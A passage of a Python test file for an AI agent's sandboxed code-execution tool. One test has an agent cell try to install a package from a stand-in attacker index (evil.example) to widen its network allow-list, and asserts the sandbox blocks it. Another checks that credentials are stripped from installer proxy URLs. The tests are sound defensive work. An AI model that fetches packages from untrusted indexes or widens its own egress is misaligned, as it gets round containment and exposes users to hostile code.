        await install(["humanize"], index_url="https://evil.example/simple")
        widened = "accepted"
    except Exception as exc:
        widened = type(exc).__name__
    try:
        await install(["--index-url=https://evil.example/simple", "humanize"])
        option = "accepted"
    except Exception as exc:
        option = type(exc).__name__
    (first["success"], widened, option)
    """,
)


@needs_bwrap
@pytest.mark.asyncio
@pytest.mark.timeout(240)
@_handle_project
async def test_a_cell_cannot_widen_the_allow_list(core_world, monkeypatch):
    from unify.actor import core_surface
    from unify.actor.execution import _CURRENT_SANDBOX, PythonExecutionSession
    from unify.actor.execution import worker

    assert worker.enabled(), "cells must run in the sandboxed worker"

    allowed: list[frozenset] = []
    launched: list[tuple[list[str], dict]] = []
    original = sandbox.EgressProxy.__init__

    def watched(self, hosts):
        original(self, hosts)
        allowed.append(self.allowed)

    def fake_run(argv, **kwargs):
        launched.append((list(argv), dict(kwargs.get("env") or {})))
        if "venv" in argv and "pip" not in argv:
            python = environment.environment_python()
            python.parent.mkdir(parents=True, exist_ok=True)
            python.touch()
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(sandbox.EgressProxy, "__init__", watched)
    monkeypatch.setattr(environment, "subprocess", types.SimpleNamespace(run=fake_run))

    actor = new_actor()
    session = PythonExecutionSession(environments={})
    objects = core_surface.sandbox_objects(actor, policy=core_surface.WritePolicy())
    session.global_state.update(objects)
    session.core_globals = objects
    token = _CURRENT_SANDBOX.set(session)
    try:
        out = await actor.get_tools("act")["execute_code"].fn(
            thought="Try to widen the installer's reach.",
            code=_WIDEN,
        )
    finally:
        _CURRENT_SANDBOX.reset(token)
        await session.close()
        await actor.close()
    assert out.error is None, out.error
    success, widened, option = out.result
    assert success is True
    assert widened != "accepted" and option != "accepted", (widened, option)
    # One install ran, with the harness's allow-list and the harness's proxy.
    assert allowed == [frozenset(environment.DEFAULT_INDEX_HOSTS)]
    pips = [(argv, env) for argv, env in launched if "pip" in argv]
    assert len(pips) == 1, launched
    argv, env = pips[0]
    assert not any("evil" in a for a in argv), argv
    assert not any("evil" in v for v in env.values()), env
    assert env["HTTPS_PROXY"] == f"http://127.0.0.1:{sandbox.INSTALLER_PROXY_PORT}"
    assert "NO_PROXY" not in env
    # The cell's variables stayed in the worker.
    assert "UV_INDEX_URL" not in os.environ


# ── no credentials in the installer's URLs ──────────────────────────────────


def test_the_installer_env_carries_no_userinfo(monkeypatch):
    """Proxy and index URLs reach the installer without ``user:password@``,
    keeping scheme, host, port and path; nothing else changes; the log names
    the variable only."""
    import logging

    secret_values = {
        "HTTPS_PROXY": "http://u:tok@proxy.example:3128",  # pragma: allowlist secret
        "http_proxy": "http://u:tok@proxy.example:3128/",  # pragma: allowlist secret
        "UV_INDEX_URL": "https://u:tok@mirror.example:8443/simple/?x=1",  # pragma: allowlist secret
        "UV_EXTRA_INDEX_URL": "https://a.example/s https://u:tok@b.example/s",  # pragma: allowlist secret
        "UV_INDEX": "internal=https://u:tok@c.example/simple",  # pragma: allowlist secret
    }
    plain = {
        "LANG": "C.UTF-8",
        "UV_HTTP_TIMEOUT": "30",
        "NO_PROXY": "localhost",
        "UV_DEFAULT_INDEX": "https://d.example/simple",
    }
    for name in [*secret_values, *plain]:
        monkeypatch.delenv(name, raising=False)
    for name, value in {**secret_values, **plain}.items():
        monkeypatch.setenv(name, value)
    records: list[str] = []
    handler = logging.Handler(logging.DEBUG)
    handler.emit = lambda record: records.append(record.getMessage())
    # Unify's loggers do not propagate to the root, where caplog listens.
    logger = logging.getLogger("unify.environment")
    logger.addHandler(handler)
    try:
        env = environment.installer_env()
    finally:
        logger.removeHandler(handler)
    assert not any("u:tok" in v or "tok@" in v for v in env.values()), env
    assert env["HTTPS_PROXY"] == "http://proxy.example:3128"
    assert env["http_proxy"] == "http://proxy.example:3128/"
    assert env["UV_INDEX_URL"] == "https://mirror.example:8443/simple/?x=1"
    assert env["UV_EXTRA_INDEX_URL"] == "https://a.example/s https://b.example/s"
    assert env["UV_INDEX"] == "internal=https://c.example/simple"
    for name, value in plain.items():
        assert env[name] == value, name
    logged = "\n".join(records)
    assert "tok" not in logged and "proxy.example" not in logged, logged
    for name in secret_values:
        assert f"userinfo removed from {name}" in logged
